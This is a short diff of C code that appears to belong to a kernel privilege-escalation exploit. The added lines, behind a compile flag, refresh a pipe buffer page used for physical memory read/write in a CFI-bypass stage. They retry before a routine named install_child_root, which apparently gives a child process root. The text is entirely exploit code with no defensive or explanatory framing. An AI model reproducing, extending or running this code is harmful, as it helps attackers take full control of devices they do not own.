@@ -375,12 +375,31 @@ int try_cfi_stage(void) {
   }
 #endif
 
+#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
+  pipebuf_page_base = prepare_pipe_buffer_page();
+  pr_info("fresh physrw pipe after verified fops page=%016zx\n",
+          pipebuf_page_base);
+  if (!is_direct_ptr(pipebuf_page_base)) {
+    cfi_last_step = 8;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+#endif
+
   int installed = 0;
   pipe_stage_attempts = 0;
   for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
     pipe_stage_attempts++;
     if (attempt != 0) {
       reset_pipe_attempt();
+#if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
+      pipebuf_page_base = prepare_pipe_buffer_page();
+      pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
+              attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
+      if (!is_direct_ptr(pipebuf_page_base)) {
+        continue;
+      }
+#endif
     }
     if (install_child_root(fd)) {
       installed = 1;
